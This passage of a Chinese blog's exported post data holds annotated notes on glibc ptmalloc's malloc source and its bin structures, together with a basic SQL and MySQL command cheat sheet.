| PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125;/****************************************************************** 以上代码从last_remainder截取chunk******************************************************************/ /****************************************************************** 恰好等于申请chunk大小，返回chunk结束******************************************************************/ /* remove from unsorted list */ unsorted_chunks (av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunks (av); /* Take now instead of binning if exact fit */ if (size == nb) &#123; set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) set_non_main_arena (victim);#if USE_TCACHE /* Fill cache first, return to user only if cache fills. We may return one of these chunks later. */ if (tcache_nb &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) &#123; tcache_put (victim, tc_idx); return_cached = 1; continue; &#125; else &#123;#endif check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p;#if USE_TCACHE &#125;#endif &#125;/****************************************************************** 恰好等于申请chunk大小，返回chunk结束******************************************************************/ /* place chunk in bin *//****************************************************************** victim放到对应大小的smallbin或者largebin******************************************************************/ if (in_smallbin_range (size)) &#123; victim_index = smallbin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; //mchunkptr fwd; &#125; else &#123; victim_index = largebin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; /* maintain large bins in sorted order */ if (fwd != bck) &#123; /* Or with inuse bit to speed comparisons */ size |= PREV_INUSE; /* if smaller than smallest, bypass loop below */ assert (chunk_main_arena (bck-&gt;bk)); if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk)) &#123; fwd = bck; bck = bck-&gt;bk; victim-&gt;fd_nextsize = fwd-&gt;fd; victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; else &#123; assert (chunk_main_arena (fwd)); while ((unsigned long) size &lt; chunksize_nomask (fwd)) &#123; fwd = fwd-&gt;fd_nextsize; assert (chunk_main_arena (fwd)); &#125; if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd)) /* Always insert in the second position. */ fwd = fwd-&gt;fd; else &#123; victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; bck = fwd-&gt;bk; &#125; &#125; else victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim; &#125; mark_bin (av, victim_index); victim-&gt;bk = bck; victim-&gt;fd = fwd; fwd-&gt;bk = victim; bck-&gt;fd = victim;#if USE_TCACHE /* If we've processed as many chunks as we're allowed while filling the cache, return one of the cached ones. */ ++tcache_unsorted_count; if (return_cached &amp;&amp; mp_.tcache_unsorted_limit &gt; 0 &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit) &#123; return tcache_get (tc_idx); &#125;#endif/****************************************************************** 放到对应大小的smallbin或者largebin******************************************************************/ #define MAX_ITERS 10000 if (++iters &gt;= MAX_ITERS) break; &#125; 如果在largebin范围（相对上一次，smallbin又加入了fastbin和unsortedbin的chunk） 到此为止，fastbin，unsortedbin的空闲chunk都已处理 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566/* If a large request, scan through the chunks of current bin in sorted order to find smallest that fits. Use the skip list for this. */ if (!in_smallbin_range (nb)) &#123; bin = bin_at (av, idx); /* skip scan if empty or largest chunk is too small */ if ((victim = first (bin)) != bin &amp;&amp; (unsigned long) chunksize_nomask (victim) &gt;= (unsigned long) (nb)) &#123; victim = victim-&gt;bk_nextsize; while (((unsigned long) (size = chunksize (victim)) &lt; (unsigned long) (nb))) victim = victim-&gt;bk_nextsize; /* Avoid removing the first entry for a size so that the skip list does not have to be rerouted. */ if (victim != last (bin) &amp;&amp; chunksize_nomask (victim) == chunksize_nomask (victim-&gt;fd)) victim = victim-&gt;fd; remainder_size = size - nb; unlink (av, victim, bck, fwd); /* Exhaust */ if (remainder_size &lt; MINSIZE) &#123; set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) set_non_main_arena (victim); &#125; /* Split */ else &#123; remainder = chunk_at_offset (victim, nb); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ bck = unsorted_chunks (av); fwd = bck-&gt;fd; if (__glibc_unlikely (fwd-&gt;bk != bck)) malloc_printerr (\"malloc(): corrupted unsorted chunks\"); remainder-&gt;bk = bck; remainder-&gt;fd = fwd; bck-&gt;fd = remainder; fwd-&gt;bk = remainder; if (!in_smallbin_range (remainder_size)) &#123; remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); &#125; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; 寻找binmap中是否有足够大的chunk 根据binmap找到的small bin 和 large bin含有free chunk的bin，去找足够大小的chunk 123456#define NBINS 128#define BINMAPSHIFT 5#define BITSPERMAP (1U &lt;&lt; BINMAPSHIFT)#define BINMAPSIZE (NBINS / BITSPERMAP)unsigned int binmap[BINMAPSIZE]; //ptmalloc 用一个 bit 来标识某一个 bin 中是否包含空闲 chunk 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107 /* Search for a chunk by scanning bins, starting with next largest bin. This search is strictly by best-fit; i.e., the smallest (with ties going to approximately the least recently used) chunk that fits is selected. The bitmap avoids needing to check that most blocks are nonempty. The particular case of skipping all bins during warm-up phases when no chunks have been returned yet is faster than it might look. */ ++idx; bin = bin_at (av, idx); block = idx2block (idx); map = av-&gt;binmap[block]; bit = idx2bit (idx); for (;; ) &#123; /* Skip rest of block if there are no more set bits in this block. */ if (bit &gt; map || bit == 0) &#123; do &#123; if (++block &gt;= BINMAPSIZE) /* out of bins */ goto use_top; &#125; while ((map = av-&gt;binmap[block]) == 0); bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT)); bit = 1; &#125; /* Advance to bin with set bit. There must be one. */ while ((bit &amp; map) == 0) &#123; bin = next_bin (bin); bit &lt;&lt;= 1; assert (bit != 0); &#125; /* Inspect the bin. It is likely to be non-empty */ victim = last (bin); /* If a false alarm (empty bin), clear the bit. */ if (victim == bin) &#123; av-&gt;binmap[block] = map &amp;= ~bit; /* Write through */ bin = next_bin (bin); bit &lt;&lt;= 1; &#125; else &#123; size = chunksize (victim); /* We know the first chunk in this bin is big enough to use. */ assert ((unsigned long) (size) &gt;= (unsigned long) (nb)); remainder_size = size - nb; /* unlink */ unlink (av, victim, bck, fwd); /* Exhaust */ if (remainder_size &lt; MINSIZE) &#123; set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) set_non_main_arena (victim); &#125; /* Split */ else &#123; remainder = chunk_at_offset (victim, nb); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ bck = unsorted_chunks (av); fwd = bck-&gt;fd;if (__glibc_unlikely (fwd-&gt;bk != bck)) malloc_printerr (\"malloc(): corrupted unsorted chunks 2\"); remainder-&gt;bk = bck; remainder-&gt;fd = fwd; bck-&gt;fd = remainder; fwd-&gt;bk = remainder; /* advertise as last remainder */ if (in_smallbin_range (nb)) av-&gt;last_remainder = remainder; if (!in_smallbin_range (remainder_size)) &#123; remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); &#125; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; 查看top chunk123456789101112131415161718192021222324252627282930313233343536373839404142434445use_top: /* If large enough, split off the chunk bordering the end of memory (held in av-&gt;top). Note that this is in accord with the best-fit search rule. In effect, av-&gt;top is treated as larger (and thus less well fitting) than any other available chunk since it can be extended to be as large as necessary (up to system limitations). We require that av-&gt;top always exists (i.e., has size &gt;= MINSIZE) after initialization, so if it would otherwise be exhausted by current request, it is replenished. (The main reason for ensuring it exists is that we may need MINSIZE space to put in fenceposts in sysmalloc.) */ victim = av-&gt;top; size = chunksize (victim); if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) &#123; remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); av-&gt;top = remainder; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; /* When we are using atomic ops to free fast chunks we can get here for all block sizes. */ else if (atomic_load_relaxed (&amp;av-&gt;have_fastchunks)) &#123; malloc_consolidate (av); /* restore original bin index */ if (in_smallbin_range (nb)) idx = smallbin_index (nb); else idx = largebin_index (nb); &#125; 调用sysmalloc1234567else &#123; void *p = sysmalloc (nb, av); if (p != NULL) alloc_perturb (p, bytes); return p; &#125; 涉及函数列表alloc_perturb1234567891011static int perturb_byte;static voidalloc_perturb (char *p, size_t n)&#123; if (__glibc_unlikely (perturb_byte)) memset (p, perturb_byte ^ 0xff, n);&#125;/*void *memset(void *s, int ch, size_t n);将s中当前位置后面的n个字节 （typedef unsigned int size_t ）用 ch 替换并返回 s assert()123#include &lt;assert.h&gt;void assert( int expression );/*assert的作用是现计算表达式 expression ，如果其值为假（即为0），那么它先向stderr打印一条出错信息，然后通过调用 abort 来终止程序运行 bin_at1234/* addressing -- note that bin_at(0) does not exist */#define bin_at(m, i) \\ (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2])) \\ - offsetof (struct malloc_chunk, fd)) catomic_compare_and_exchange_val_acq()123456789101112131415161718catomic_compare_and_exchange_val_acq如果*MEM等于OLDVAL，则将*MEM存储为NEWVAL，返回OLDVAL；/* Atomically store NEWVAL in *MEM if *MEM is equal to OLDVAL.Return the old *MEM value. */#ifndef catomic_compare_and_exchange_val_acq# ifdef __arch_c_compare_and_exchange_val_32_acq# define catomic_compare_and_exchange_val_acq(mem, newval, oldval) \\__atomic_val_bysize (__arch_c_compare_and_exchange_val,acq, \\ mem, newval, oldval)# else# define catomic_compare_and_exchange_val_acq(mem, newval, oldval) \\atomic_compare_and_exchange_val_acq (mem, newval, oldval)# endif#endif 相关博客链接https://blog.csdn.net/luozhaotian/article/details/80267895 check_malloced_chunk1234567891011121314151617181920# define check_malloced_chunk(A, P, N) do_check_malloced_chunk (A, P, N)static voiddo_check_malloced_chunk (mstate av, mchunkptr p, INTERNAL_SIZE_T s)&#123; /* same as recycled case ... */ do_check_remalloced_chunk (av, p, s); /* ... plus, must obey implementation invariant that prev_inuse is always true of any allocated chunk; i.e., that each allocated chunk borders either a previously allocated and still in-use chunk, or the base of its memory arena. This is ensured by making all allocations from the `lowest' part of any found chunk. This does not necessarily hold however for chunks recycled via fastbins. */ assert (prev_inuse (p));&#125; check_remalloced_chunk ()1234567891011121314151617181920212223242526272829# define check_remalloced_chunk(A, P, N) do_check_remalloced_chunk (A, P, N)static voiddo_check_remalloced_chunk (mstate av, mchunkptr p, INTERNAL_SIZE_T s)&#123; INTERNAL_SIZE_T sz = chunksize_nomask (p) &amp; ~(PREV_INUSE | NON_MAIN_ARENA); if (!chunk_is_mmapped (p)) &#123; assert (av == arena_for_chunk (p)); if (chunk_main_arena (p)) assert (av == &amp;main_arena); else assert (av != &amp;main_arena); &#125; do_check_inuse_chunk (av, p); /* Legal size ... */ assert ((sz &amp; MALLOC_ALIGN_MASK) == 0); assert ((unsigned long) (sz) &gt;= MINSIZE); /* ... and alignment */ assert (aligned_OK (chunk2mem (p))); /* chunk is less than MINSIZE more than request */ assert ((long) (sz) - (long) (s) &gt;= 0); assert ((long) (sz) - (long) (s + MINSIZE) &lt; 0);&#125;/*chunk_is_mmapped检查是否是mmap位是否为1,当mmap为1的时候可以跳过此检查 do_check_inuse_chunk检查previnuse是否为1 chunk2mem12#define chunk2mem(p) ((void*)((char*)(p) + 2*SIZE_SZ))//从malloc头到用户指针的转换 chunksize1234567#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)/* Get size, ignoring use bits */#define chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))/* Like chunksize, but do not mask SIZE_BITS. */#define chunksize_nomask(p) ((p)-&gt;mchunk_size)//标志位清0 last()1#define last(b) ((b)-&gt;bk) largebin_index1234#define largebin_index(sz) \\ (SIZE_SZ == 8 ? largebin_index_64 (sz) \\ : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz) \\ : largebin_index_32 (sz)) fastbin_index(sz)1234#define fastbin_index(sz) \\ ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)//计算bin下标 fastbin(ar_ptr, idx)1234typedef struct malloc_chunk *mfastbinptr;/* Fastbins */mfastbinptr fastbinsY[NFASTBINS];#define fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx]) first()1#define first(b) ((b)-&gt;fd) set_inuse_bit_at_offset123#define set_inuse_bit_at_offset(p, s) \\ (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)//将物理相邻的下一个chunk的PREV_INUSE置为一 set_non_main_arena(1#define set_non_main_arena(p) ((p)-&gt;mchunk_size |= NON_MAIN_ARENA) smallbin_index123#define smallbin_index(sz) \\ ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\\ + SMALLBIN_CORRECTION) unlink1234567891011121314151617181920212223242526272829303132/* Take a chunk off a bin list */#define unlink(AV, P, BK, FD) &#123; \\ if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\ malloc_printerr (\"corrupted size vs. prev_size\"); \\ FD = P-&gt;fd; \\ BK = P-&gt;bk; \\ if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (\"corrupted double-linked list\"); \\ else &#123; \\ FD-&gt;bk = BK; \\ BK-&gt;fd = FD; \\ if (!in_smallbin_range (chunksize_nomask (P)) \\ &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123; \\ if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) \\ || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0)) \\ malloc_printerr (\"corrupted double-linked list (not small)\"); \\ if (FD-&gt;fd_nextsize == NULL) &#123; \\ if (P-&gt;fd_nextsize == P) \\ FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; \\ else &#123; \\ FD-&gt;fd_nextsize = P-&gt;fd_nextsize; \\ FD-&gt;bk_nextsize = P-&gt;bk_nextsize; \\ P-&gt;fd_nextsize-&gt;bk_nextsize = FD; \\ P-&gt;bk_nextsize-&gt;fd_nextsize = FD; \\ &#125; \\ &#125; else &#123; \\ P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; \\ P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; \\ &#125; \\ &#125; \\ &#125; \\&#125; __glibc_likely1234567891011121314#if __GNUC__ &gt;= 3# define __glibc_unlikely(cond) __builtin_expect ((cond), 0)# define __glibc_likely(cond) __builtin_expect ((cond), 1)#else# define __glibc_unlikely(cond) (cond)# define __glibc_likely(cond) (cond)#endif （先将返回值看成 cond的值就行） 程序员可以使用likely/unlikely宏来预测cond的结果，然后通知编译器在编译时优化这个分支的汇编代码原型: long __builtin_expect (long EXP, long C)，函数返回值就是EXP表达式的值，C是一个常量(0或1)，函数在语义上期待EXP==C 相关博客链接 https://turingsec.github.io/builtin_expect/ 涉及变量SINGLE_THREAD_P1234/* For SINGLE_THREAD_P. */#include &lt;sysdep-cancel.h&gt;//从&lt;sysdep-cancel.h&gt;得到大概看了不是很懂，大概意思单线程为 1 多线程为 0 (自己猜的：不保证正确性) 相关结构malloc_chunk123456789101112struct malloc_chunk &#123; INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T mchunk_size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;; malloc_state 该结构用于管理堆，记录每个 arena 当前申请的内存的具体状态，比如说是否有空闲 chunk，有什么大小的空闲 chunk 等等。无论是 thread arena 还是 main arena，它们都只有一个 malloc state 结构。由于 thread 的 arena 可能有多个，malloc state 结构会在最新申请的 arena 中。 main arena 的 malloc_state 并不是 heap segment 的一部分，而是一个全局变量，存储在 libc.so数据段 __libc_lock_define(, mutex); 该变量用于控制程序串行访问同一个分配区，当一个线程获取了分配区之后，其它线程要想访问该分配区，就必须等待该线程分配完成候才能够使用。 flags flags 记录了分配区的一些标志，比如 bit0 记录了分配区是否有 fast bin chunk ，bit1 标识分配区是否能返回连续的虚拟地址空间。具体如下 fastbinsY[NFASTBINS]存放每个 fast chunk 链表头部的指针 top指向分配区的 top chunk last_reminder最新的 chunk 分割之后剩下的那部分 bins用于存储 unstored bin，small bins 和 large bins 的 chunk 链表。 binmapptmalloc 用一个 bit 来标识某一个 bin 中是否包含空闲 chunk 。 12345678910111213141516171819202122232425262728293031323334353637383940414243struct malloc_state&#123; /* Serialize access. */ __libc_lock_define (, mutex); /* Flags (formerly in max_fast). */ int flags; /* Set if the fastbin chunks contain recently inserted free blocks. */ /* Note this is a bool but not all targets support atomics on booleans. */ int have_fastchunks; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state *next_free; /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ INTERNAL_SIZE_T attached_threads; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;&#125;; 123#define NFASTBINS (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)#define NBINS 128#define NSMALLBINS 64 流程概述1234567891011121314151617181920212223242526272829ptmalloc 的响应用户内存分配要求的具体步骤为:1) 获取分配区的锁, 为了防止多个线程同时访问同一个分配区, 在进行分配之前需要取得分配区域的锁. 线程先查看线程私有实例中是否已经存在一个分配区, 如果存 在尝试对该分配区加锁, 如果加锁成功, 使用该分配区分配内存, 否则, 该线程搜 索分配区循环链表试图获得一个空闲（没有加锁）的分配区. 如果所有的分配区都 已经加锁, 那么 ptmalloc 会开辟一个新的分配区, 把该分配区加入到全局分配区循 环链表和线程的私有实例中并加锁, 然后使用该分配区进行分配操作. 开辟出来的 新分配区一定为非主分配区, 因为主分配区是从父进程那里继承来的. 开辟非主分配区时会调用 mmap()创建一个 sub-heap, 并设置好 top chunk.2) 将用户的请求大小转换为实际需要分配的 chunk 空间大小. 具体查看 request2size 宏 (malloc.c:3332)3) 判断所需分配 chunk 的大小是否满足 chunk_size &lt;= max_fast (max_fast 默认为 64B), 如果是的话, 则转下一步, 否则跳到第 5 步. (malloc.c:3340)4) 首先尝试在 Fastbins 中查找所需大小的 chunk 分配给用户. 如果可以找到, 则分配结束. 否则转到下一步. (malloc.c:3340)5) 判断所需大小是否处在 small bins 中, 即判断 chunk_size &lt; 512B 是否成立. 如果 chunk 大小处在 small bins 中, 则转下一步, 否则转到第 7 步. (malloc.c:3377)6) 根据所需分配的 chunk 的大小, 找到具体所在的某个 small bin, 从该 Bin 的尾部摘取一个恰好满足大小的 chunk. 若成功, 则分配结束, 否则, 转到 8. (malloc.c:3377)7) 到了这一步, 说明需要分配的是一块大的内存, 于是, ptmalloc 首先会遍历 Fastbins 中的 chunk, 将相邻的空闲 chunk 进行合并, 并链接到 unsorted bin 中. 对于 Fastbins 的合并是由 `malloc_consolidate` 做处理. (malloc.c:3421)8) 遍历 unsorted bin 中的 chunk, 如果请求的 chunk 是一个 small chunk, 且 unsorted bin 只有一个 chunk, 并且这个 chunk 在上次分配时被使用过(也就是 last_remainder), 并且 chunk 的大小大于 (分配的大小 + MINSIZE), 这种情况下就直接将该 chunk 进行切割, 分配结束, 否则继续遍历, 如果发现一个 unsorted bin 的 size 恰好等于需要分配的 size, 命中缓存, 分配结束, 否则将根据 chunk 的空间大小将其放入对应的 small bins 或是 large bins 中, 遍历完成后, 转入下一步. (malloc.c:3442)9) 到了这一步说明需要分配的是一块大的内存, 并且 Fastbins 和 unsorted bin 中所有的 chunk 都清除干净 了. 从 large bins 中按照 “smallest-first, best-fit”(最小&amp;合适, 也就是说大于或等于所需 size 的最小 chunk) 原则, 找一个合适的 chunk, 从中划分一块合适大小的 chunk 进行切割, 并将剩下的部分放到 unsorted bin, 若操作成功, 则分配结束, 否则转到下一步. (malloc.c:3576)10) 到了这一步说明在对应的 bin 上没有找到合适的大小, 无论是 small bin 还是 large bin, 对于 small bin, 如果没有对应大小的 small bin, 只能 idx+1. 对于 large bin,在上一步的 large bin 并不一定能找到合适的 chunk 进行切割, 因为 large bins 间隔是很大的, 假如当前的 idx 的 large bin 只有一个 chunk, 但是所需 size 大于该 chunk, 这就导致找不到合适的, 只能继续 idx+1, 最后都需要根据 bitmap 找到之后第一个非空闲的 bin. 在这两种情况下找到的 bin 中的 chunk 一定可以进行切割或者全部分配(剩余的 size &lt; MINSIZE) (malloc.c:3649)11) 如果仍然都没有找到合适的 chunk, 那么就需要操作 top chunk 来进行分配了. 判断 top chunk 大小是否满足所需 chunk 的大小, 如果是, 则从 top chunk 中分出一块来. 否则转到下一步. (malloc.c:3749)12) 到了这一步, 说明 top chunk 也不能满足分配要求, 所以, 于是就有了两个选择: 如果是主分配区, 调用 sbrk(), 增加 top chunk 大小；如果是非主分配区, 调用 mmap 来分配一个新的 sub-heap, 增加 top chunk 大小；或者使用 mmap()来直接分配. 在这里, 需要依靠 chunk 的大小来决定到底使用哪种方法. 判断所需分配的 chunk 大小是否大于等于 mmap 分配阈值, 如果是的话, 则转下一步, 调用 mmap 分配, 否则跳到第 13 步, 增加 top chunk 的大小. (malloc.c:3800)13) 使用 mmap 系统调用为程序的内存空间映射一块 chunk_size align 4kB 大小的空间. 然后将内存指针返回给用户.14) 判断是否为第一次调用 malloc, 若是主分配区, 则需要进行一次初始化工作, 分配一块大小为(chunk_size + 128KB) align 4KB 大小的空间作为初始的 heap. 若已经初始化过了, 主分配区则调用 sbrk()增加 heap 空间, 分主分配区则在 top chunk 中切割出一个 chunk, 使之满足分配需求, 并将内存指针返回给用户. 图示意","categories":[{"name":"堆","slug":"堆","permalink":"https://www.zzl14.xyz/categories/堆/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://www.zzl14.xyz/tags/linux/"},{"name":"malloc","slug":"malloc","permalink":"https://www.zzl14.xyz/tags/malloc/"}]},{"title":"sql命令","slug":"sql命令","date":"2020-04-10T08:25:10.000Z","updated":"2020-04-15T02:09:50.548Z","comments":true,"path":"2020/04/10/sql命令/","link":"","permalink":"https://www.zzl14.xyz/2020/04/10/sql命令/","excerpt":"","text":"数据库操作命令 sql命令对大小写不敏感，大小写作用相同 命令行界面命令(要加;) 12345678- mysql -u 名字 -p 密码 #在命令行登录mysql- select user(); #查询当前用户- select database() #查询当前使用的数据库- show databases ; #显示所有数据库- use database_name; #更改当前数据库- show tables; #显示数据库的表- describe 表名; #显示表数据- mysqldump -u 用户名 –p 数据库名 &gt; 导出的文件名; #导出数据库文件 常用SQL命令1234567891011121314151617SELECT - 从数据库中提取数据UPDATE - 更新数据库中的数据DELETE - 删除数据INSERT INTO - 向数据库中插入新数据CREATE - 创建ALTER DROP - 删除whereand ordistinctorder bylikeinbetweenasunionview 通配符 通配符 描述 % 替代 0 个或多个字符 _ 替代一个字符 [charlist] 字符列中的任何单一字符 [^charlist] 或 [!charlist] 不在字符列中的任何单一字符 库的基本操作123create database &lt;数据库名&gt; #创建数据库drop database &lt;数据库名&gt; #删除数据库use &lt;数据库名&gt; #进入相应数据库（也可以在图形界面直接点击） 表的基本操作 设有表stu包括name和age两个字段,类型是varchar(30)和smallint 1234567891011121314create table stu(name varchar(30),age smallint) #创建数据库表 #可以在数据类型后面加 default &lt;value&gt; 设置默认值 #也可以在数据类型后面设置是否为主键等desc stu #查看指定表的结构(字段和对应类型)insert into stu(name,age) values(&apos;a&apos;,1) #向表内插入一条数据‘a’和1 #stu()的字段内容可不填，但这样values()内值的数量与类型要与表的字段一一对应 select name,age from stu #查找表内对应字段的内容 # select * from table 查询表的全部字段内容 drop table &lt;表名&gt; #删除表set &lt;字段名&gt; utf8 #设置字段名的字符集 创建用户,设置权限12345678910111213141516create login &lt;登录名&gt; with password =&apos;密码&apos;,default_database=&lt;数据库名&gt;#创建登录使用的一个用户，类似 rootcreate user &lt;用户名&gt; for login &lt;登录名&gt; with default_schema=&lt;表名&gt;#为登录时的用户创建某个表的用户grant &lt;权限&gt; on &lt;表名&gt; to &lt;用户名&gt; (with grant option 加上后给了用户授权的权限)#给某个用户某个表的权限revoke &lt;权限&gt; on &lt;表名&gt; from &lt;用户名&gt;flush privileges; #刷新系统权限表show grants for &lt;用户名&gt; #查看用户权限 权限123456789101112select #查询insert #添加update #更改 delete #删除create #创建alter #修改drop #删除index #索引create view #创建视图show view #查看视图all privilege #所有权限 角色 方便权限的管理操作，（我看做把权限打包给一个角色） 12345678910create role r1#创建角色grant &lt;权限&gt; on &lt;表名&gt; to r1 (with grant option 加上后给了用户授权的权限)#给角色某个表的权限revoke &lt;权限&gt; on &lt;表名&gt; from &lt;用户名&gt;#回收角色的某个权限grant r1 to &lt;用户名&gt; 敏感度标记（作为了解）1234567敏感度标记分成若干级别绝密(Top Secret,TS )机密(Secret, S)可信(Confidential, C)公开(Public,P)TS&gt;=S&gt;=C&gt;=P 仅当主体的许可证级别大于或等于客体的密级时，该主体才能读取客体 仅当主体的许可证级别等于客体的密级时，该主体才能写相应的客体","categories":[{"name":"命令","slug":"命令","permalink":"https://www.zzl14.xyz/categories/命令/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://www.zzl14.xyz/tags/sql/"}]},{"title":"bins","slug":"bins","date":"2020-04-07T10:27:08.000Z","updated":"2020-04-19T05:43:46.035Z","comments":true,"path":"2020/04/07/bins/","link":"","permalink":"https://www.zzl14.xyz/2020/04/07/bins/","excerpt":"","text":"bin是一个由struct chunk结构体组成的链表 bin 用来管理被释放的free chunk，方便下次申请内存使用 ptmalloc 一共维护了 128 个这样的 bin malloc chunk struct chunk结构struct chunk结构体如下 123456789101112131415161718192021typedef struct malloc_chunk* mchunkptr;typedef struct malloc_chunk *mfastbinptr; struct malloc_state&#123; ... /*other member*/ ... /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; //存放每个 fast chunk 链表头部的指针 /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; //用于存储 unstored bin，small bins 和 large bins 的 chunk 链表。 ... /*other member*/ ...&#125;; 可以看到有fastbinsY和bins两种bin数组 fastbinY fastbinsY数组的bin主要回收32字节~128字节（0x20~0x80）的chunk，fastbin 最多可以支持的 bin 的个数为 10 个， fastbin是单链表，只用到fd指针,遍历顺序是LIFO（后进先出） prev_inuse位不置0,防止合并 32位系统下 第一个fast bin（index 0）包含16字节chunk的binlist，第二个fast bin（index 1）包含24字节chunk的binlist … chunk大小对应下标 0 1 2 3 4 5 6 7 8 9 0x10 0x18 0x20 0x28 0x30 0x38 0x40 0x48 0x50 0x58 32位 0x20 0x30 0x40 0x50 0x60 0x70 0x80 64位 但是不知道为什么fastbin有十个却好像只用了前七个（貌似与malloc初始化有关) 在32位系统中，fastbin里chunk的大小范围从16到64； –&gt;0x10到0x40 在64位系统中，fastbin里chunk的大小范围从32到128; –&gt;0x20到0x80 求fastbin的索引 12345678#define fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[ idx ])/* offset 2 to use otherwise unindexable first 2 bins */// chunk size=2*size_sz*(2+idx)// 这里要减2，否则的话，前两个bin没有办法索引到。#define fastbin_index(sz) \\ ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2) //64位除16减去2，32位除8减去2 bins bins数组中的第一个 bin 是 unsorted bin（1个），数组中从第 2 个到第 63 个 bin 是 small bin（62个），64到126为large bin（63个） 三种bin都是由free chunks组成的循环双链表 unsortedbin和small bin采用FIFO(先入先出)算法, unsorted bin中，对chunk的大小并没有限制，任何大小的chunk都可以归属到unsorted bin中。当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到unsorted bin中 small bin中chunk的大小依次增加两个机器字长,与fastbin一样.不过bin有62个，chunk大小从0x10到0x1f8(32位)0x20到0x3f0（64位） largin bin 中 chunk 的大小不是固定的，而是有一个范围。其中的顺序是按从大到小排序的,大的chunk放在一个链表的头部，最小的chunk放在尾部；相同大小的chunk按照最近使用顺序排序 在这63个large 